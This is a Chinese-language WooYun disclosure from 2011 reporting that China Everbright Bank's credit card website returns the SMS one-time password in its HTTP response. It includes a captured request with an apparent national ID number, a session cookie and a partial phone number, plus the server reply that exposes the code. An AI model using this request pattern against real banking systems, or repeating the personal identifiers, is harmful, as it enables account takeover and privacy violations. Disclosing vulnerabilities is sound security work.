wybug_title: 光大银行信用卡手机动态密码泄露
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2011-10-22：	细节已通知厂商并且等待厂商处理中									2011-10-29：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 很简单，通过HTTPWATCH可以抓到手机的动态密码 详细说明：  
POST /home/ps/ps-req-randompwd.htm?identitynum=622821198605142112 HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: http://xyk.cebbank.com/home/ps/ps-req-fillform.htmAccept: */*Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: xyk.cebbank.comContent-Length: 37Connection: Keep-AliveCache-Control: no-cacheCookie: cart=; viewed=4319,; gdid=2807a8c0; JSESSIONID=sGLVThjdVTyn6RGb0nDHHCxCpfYQDhBjTCNbwhhZRvJ1TG2Q2Qnb!-124692861random=233280&mobilephone=1337903****

HTTP/1.1 200 OKDate: Fri, 21 Oct 2011 16:56:49 GMTServer: Apache/2.2.17 (Unix)prov: brainsContent-Language: zh-CNX-Powered-By: Servlet/2.5 JSP/2.1Content-Type: text/html;charset=UTF-8Content-Length: 92Connection: Keep-aliveVia: 1.1 AN-0003011044314104{"flag":"0","msg":"006070","random":"783686","scores":"","nowContinue":""}
